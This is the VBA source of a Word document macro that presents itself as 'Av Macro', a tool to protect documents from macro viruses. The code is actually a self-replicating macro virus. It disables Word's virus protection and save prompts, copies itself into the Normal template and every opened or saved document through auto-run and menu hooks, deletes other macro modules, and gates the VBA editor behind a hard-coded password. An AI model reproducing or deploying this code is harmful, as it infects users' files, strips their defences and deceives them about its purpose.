   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AvMacro"
   Public Passwrd As Boolean

   Sub PassAway()
       Options.SaveNormalPrompt = False
       Options.VirusProtection = False
       Options.SavePropertiesPrompt = False
   End Sub

   Sub ViewVbCode()
       OpenMyMacro
   End Sub

   Sub FileTemplates()
       OpenMyMacro
   End Sub

   Sub ToolsOptions()
       Options.SaveNormalPrompt = True
       Options.SavePropertiesPrompt = True
       Options.VirusProtection = True
       On Error Resume Next
       Dialogs(wdDialogToolsOptions).Show
       PassAway
   End Sub

   Sub OpenMyMacro()
       Msg = "A simple program to protect your" & Chr(13)
       Msg = Msg & "documents from destroying macro viruses" & Chr(13) & Chr(13)
       Msg = Msg & " If you want to edit this program source" & Chr(13)
       Msg = Msg & "call or contact LabCom FT UNS (Mr. Widi)" & Chr(13) & Chr(13) & Chr(13)
       Msg = Msg & "Enter password to edit this program"

       If InputBox(Msg, "Av Macro") = "widi h" Then
          Application.ShowVisualBasicEditor = True
       End If
   End Sub

   Sub SaveDocument()
       Dim DocOk As Boolean
       DocOk = False
       On Error Resume Next
       For Each Obj In ActiveDocument.VBProject.VBComponents
           If Obj.Name = "AvMacro" Then DocOk = True
           If Obj.Name <> "AvMacro" And Obj.Name <> "ThisDocument" Then
               Application.OrganizerDelete Source:=ActiveDocument.FullName, _
               Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
           End If
       Next Obj
       If DocOk = False Then
           Application.OrganizerCopy Source:=NormalTemplate.FullName, _
           Destination:=ActiveDocument, Name:="AvMacro", Object:=wdOrganizerObjectProjectItems
       End If
   End Sub

   Sub SaveTemplate()
       Dim NorOk As Boolean
       NorOk = False
       On Error Resume Next
       For Each Obj In NormalTemplate.VBProject.VBComponents
           If Obj.Name = "AvMacro" Then NorOk = True
           If Obj.Name <> "AvMacro" And Obj.Name <> "ThisDocument" Then
               Application.OrganizerDelete Source:=NormalTemplate.FullName, _
               Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
           End If
       Next Obj
       If NorOk = False Then
           Application.OrganizerCopy Source:=ActiveDocument.FullName, _
           Destination:=NormalTemplate.FullName, Name:="AvMacro", Object:=wdOrganizerObjectProjectItems
           Application.DisplayRecentFiles = False
           Application.DisplayRecentFiles = True
       End If
   End Sub

   Sub AutoExit()
       Application.Quit
   End Sub

   Sub FileOpen()
       WordBasic.DisableAutoMacros True
       On Error Resume Next
       If Dialogs(wdDialogFileOpen).Show <> 0 Then
           SaveDocument
           ActiveDocument.Save
       End If
       WordBasic.DisableAutoMacros False
   End Sub

   Sub AutoOpen()
       PassAway
       SaveTemplate
       On Error Resume Next
       NormalTemplate.Save
   End Sub

   Sub AutoClose()
       SaveDocument
   End Sub

   Sub FileClose()
       AutoClose
   End Sub

   Sub FileSave()
       If ActiveDocument.Saved = False Then
           SaveDocument
           SaveTemplate
           On Error Resume Next
           ActiveDocument.Save
           ActiveDocument.Saved = True
       End If
   End Sub

   Sub KillMacro()
       C = Documents.Count
       If C <> 0 Then
           Normal.AvMacro.SaveDocument
           WordBasic.DisableAutoMacros False
           On Error Resume Next
           If ActiveDocument.Name <> "Document1" Then ActiveDocument.Save
       Else: Application.OnTime Now + TimeValue("00:00:07"), "Normal.AvMacro.KillMacro"
       End If
   End Sub

   Sub AutoExec()
       Passwrd = False
       WordBasic.DisableAutoMacros True
       PassAway
       Application.OnTime Now + TimeValue("00:00:07"), "Normal.AvMacro.KillMacro"
   End Sub
